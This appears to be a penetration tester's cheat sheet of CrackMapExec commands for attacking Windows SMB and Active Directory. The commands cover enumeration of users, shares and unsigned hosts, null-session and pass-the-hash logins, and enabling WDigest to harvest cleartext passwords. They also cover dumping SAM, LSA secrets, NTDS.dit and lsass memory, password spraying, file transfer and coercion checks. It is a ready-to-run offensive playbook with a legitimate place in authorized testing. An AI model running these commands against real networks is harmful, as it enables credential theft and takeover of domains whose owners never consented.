# cme

% cme-smb, crackmapexec, windows, Active directory



## smb - enumerate hosts, network
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
Example : cme smb 192.168.1.0/24

https://mpgn.gitbook.io/crackmapexec/

```bash
cme smb <ip_range>
```

## enumerate password policy
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

```bash
cme smb <ip> -u <user> -p '<password>' --pass-pol
```

## enumerate null session
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u '' -p ''
```

## enumerate anonymous login
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT

```bash
cme smb <ip> -u 'a' -p ''
```

## enumerate active sessions
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --sessions
```

## enumerate domain users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --users
```

## enumerate users by bruteforce the RID
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --rid-brute
```

## enumerate domain groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --groups
```

## enumerate local groups
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --local-groups
```

## enumerate shares
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate permissions on all shares

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --shares
```

## spider shares
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
```bash
cme smb <ip> -u <user> -p '<password>' -M spider_plus
```

## enumerate disks
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

Enumerate disks on the remote target

```bash
cme smb <ip> -u <user> -p '<password>' --disks
```

## enumerate smb target not signed
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON

Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line

```bash
cme smb <ip> --gen-relay-list smb_targets.txt
```

## enumerate logged users
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p '<password>' --loggedon-users
```

## enable wdigest
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 

enable/disable the WDigest provider and dump clear-text credentials from LSA memory.

```bash
cme smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
```

## loggout user
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT

Can be useful after enable wdigest to force user to reconnect
First use  -x 'quser'
```bash

cme smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
```

## local-auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> --local-auth
```

## local-auth with hash
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

```bash
cme smb <ip> -u <user> -H <hash> --local-auth
```

## domain auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  

```bash
cme smb <ip> -u <user> -p <password> -d <domain>
```

## kerberos auth
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 

Previously import ticket : 
export KRB5CCNAME=/tmp/ticket.ccache

```bash
cme smb <ip> --kerberos
```

## Dump SAM
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --sam
```

## Dump LSA
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --lsa
```

## dump ntds.dit
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Privileges on target Domain Controller

```bash
cme smb <ip> -u <user> -p <password> -d <domain> --ntds
```

## dump lsass
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> -u <user> -p <password> -d <domain> -M lsassy
```

## dump lsass - with bloodhond update
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER

```bash
cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
```

## password spray (user=password)
#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
```

## password spray multiple test 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning

(carrefull on lockout)

```bash
cme smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
```

## put file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
```

## get file
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
Send a local file to the remote target

```bash
cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
```


## find vulnerable to petitpotam coerce 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 

```bash
cme smb <ip> -u <user> -p <password> -M PetitPotam
```

## find runing WebDav clients (coerce over http)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
try to force WebDav to start  with -M drop-sc
```
cme smb <ip_range> -u <login> -p <passwd> -M webdav
```
